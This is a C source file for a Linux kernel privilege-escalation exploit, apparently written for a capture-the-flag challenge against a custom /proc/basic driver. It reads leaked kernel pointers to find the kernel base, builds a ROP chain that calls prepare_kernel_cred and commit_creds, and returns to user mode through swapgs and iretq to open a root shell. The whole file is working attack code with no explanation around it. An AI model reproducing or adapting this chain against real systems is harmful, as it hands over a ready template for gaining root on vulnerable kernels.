#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

unsigned long payload [2048] = {0};
unsigned long user_cs, user_ss, user_rflags, user_sp;

void get_shell(void){
	system("sh");

}

void save_state(void) {
    asm("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");

    printf("[+] State saved!\n");

}

int main(){
	signal(SIGSEGV, get_shell);
	unsigned long leak[300];
	unsigned long kbase, cc, pkc;
	int fd, getaddr;
	fd = open("/proc/basic", O_RDWR);
	read(fd, leak, sizeof(leak));
	for(int i =0 ; i < 5; i++){
		printf("leaks %p\n", leak[i]);
	}
	
	
	kbase = leak[0] - 0xa48270L;
	cc = kbase + 0x81eb0L;
	pkc = kbase + 0x820e0L;
	printf("[+] Kernel Base: %p\n", kbase);
	printf("[+] Commit creds: %p\n", cc);
	printf("[+] Prepare Kernel Cred: %p\n", pkc);
	
	save_state();
	int i = 8;
	for(int k=0; k < 24; k++){
   		 payload[i++] = 0x4141414141414141;
  	}
        payload[i++] = kbase + 0x1308L; // 0xffffffff81001308 : pop rdi ; ret
	payload[i++] = 0;
	payload[i++] = pkc; // prepare_kernel_cred

	payload[i++] = kbase + 0x68a1fL; // 0xffffffff81068a1f : pop rcx ; ret
	payload[i++] = 1;

	payload[i++] = kbase + 0x1bf8L; // 0xffffffff81001bf8 : pop rsi ; ret
	payload[i++] = 20;
	
	payload[i++] = kbase + 0x38ee76L; // 0xffffffff8138ee76 : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8138ee69 ; ret
	payload[i++] = cc; // commit_creds


	payload[i++] = kbase + 0xc00eaaL; //0xffffffff81c00eaa : swapgs ; popfq ; ret
	payload[i++] = 0; // popfq
	
	//# objdump -D extracted_bzImage | grep iretq | head -n 2
	//ffffffff81022a62:	48 cf                	iretq  
	//ffffffff81022d31:	48 cf                	iretq  
	
	payload[i++] = kbase + 0x22a62L; // iretq

	payload[i++] = (unsigned long)get_shell;
	payload[i++] = user_cs;
	payload[i++] = user_rflags;
	payload[i++] = user_sp;
	payload[i++] = user_ss;
 	ioctl(fd, 0x1337, payload);  // write exploit
	close(fd);
}
